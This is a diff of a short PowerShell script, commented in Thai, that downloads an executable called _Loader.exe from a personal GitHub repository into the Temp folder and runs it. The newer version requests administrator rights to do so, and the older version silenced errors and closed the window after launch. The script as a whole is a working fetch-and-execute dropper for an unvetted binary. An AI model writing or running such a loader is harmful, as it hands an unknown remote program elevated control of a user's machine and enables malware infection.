@@ -1,30 +1,22 @@
-# 1. ตั้งค่าพื้นฐาน
-$ErrorActionPreference = "SilentlyContinue"
-Clear-Host
+# 1. ตั้งค่าตำแหน่งดาวน์โหลด (เก็บไว้ในโฟลเดอร์ Temp ของเครื่อง)
+$exeUrl = "https://github.com/Reflexeiei885/ranvyx/raw/main/_Loader.exe"
+$outputPath = "$env:TEMP\_Loader.exe"
 
-# 2. ระบุลิงก์ดาวน์โหลดไฟล์ _Loader.exe (ต้องใช้ลิงก์ RAW เท่านั้น)
-$url = "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/main/_Loader.exe"
-
-# 3. กำหนดที่เก็บไฟล์ชั่วคราวในเครื่อง
-$dest = "$env:TEMP\_Loader.exe"
-
-# 4. ทำการดาวน์โหลดไฟล์จาก GitHub มาที่เครื่อง
+# 2. เริ่มการดาวน์โหลด
+Write-Host "Connecting to Server..." -ForegroundColor Cyan
 try {
-    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
+    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop
 } catch {
-    Write-Host "[!] Download Failed: Check your internet or link." -ForegroundColor Red
-    Pause
+    Write-Host "ดาวน์โหลดไม่สำเร็จ! กรุณาเช็คอินเทอร์เน็ตหรือลิงก์ไฟล์" -ForegroundColor Red
+    pause
     exit
 }
 
-# 5. สั่งรันโปรแกรม และปิดหน้า PowerShell ทันที
-if (Test-Path $dest) {
-    # รันไฟล์ _Loader.exe ขึ้นมา
-    Start-Process -FilePath $dest
-    # ปิดหน้าต่างสีน้ำเงินทิ้ง
-    exit
+# 3. รันไฟล์ EXE และเด้งเข้าหน้า CMD (ในฐานะ Admin)
+if (Test-Path $outputPath) {
+    Write-Host "Starting Loader..." -ForegroundColor Green
+    Start-Process -FilePath $outputPath -Verb RunAs
 } else {
-    Write-Host "[!] Error: Cannot find downloaded file." -ForegroundColor Red
-    Pause
-    exit
+    Write-Host "ไม่พบไฟล์ในเครื่อง!" -ForegroundColor Red
+    pause
 }
